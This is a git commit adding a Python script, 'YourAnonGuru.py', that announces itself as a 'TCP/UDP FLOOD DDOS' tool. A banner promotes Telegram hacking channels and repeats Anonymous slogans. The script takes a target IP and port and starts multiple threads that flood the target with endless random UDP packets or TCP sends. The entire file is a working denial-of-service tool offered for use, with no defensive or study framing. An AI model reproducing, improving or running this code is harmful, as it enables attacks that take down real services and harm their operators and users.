bbea8e514f9f01541672e590bdf69d3fdf5766bb
Anonymous <117326163+x9999999999@users.noreply.github.com>
2022-11-04 13:49:16 +0530

    Add files via upload

---
+++ YourAnonGuru.py
@@ -0,0 +1,75 @@
+#!/usr/bin/env python3
+#By YourAnonGuru
+import argparse
+import random
+import socket
+import threading
+print (""" 
+╔╗──╔╗──────╔═══╗────────╔═══╗
+║╚╗╔╝║──────║╔═╗║────────║╔═╗║
+╚╗╚╝╔╩═╦╗╔╦═╣║─║╠═╗╔══╦═╗║║─╚╬╗╔╦═╦╗╔╗
+─╚╗╔╣╔╗║║║║╔╣╚═╝║╔╗╣╔╗║╔╗╣║╔═╣║║║╔╣║║║
+──║║║╚╝║╚╝║║║╔═╗║║║║╚╝║║║║╚╩═║╚╝║║║╚╝║
+──╚╝╚══╩══╩╝╚╝─╚╩╝╚╩══╩╝╚╩═══╩══╩╝╚══╝ 
+
+                   JOIN US :-
+       https://t.me/ANONYMOUS_HACKING_IND
+       https://t.me/BLACK_HAT_IND
+
+
+""")
+
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
+ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+args = vars(ap.parse_args())
+
+print("YourAnonGuru")
+print("We Are Anonymous")
+print ("We Are Legion")
+print("Expect us")
+print("#-- TCP/UDP FLOOD DDOS --#")
+ip = args['ip']
+port = args['port']
+choice = args['choice']
+times = args['times']
+threads = args['threads']
+
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
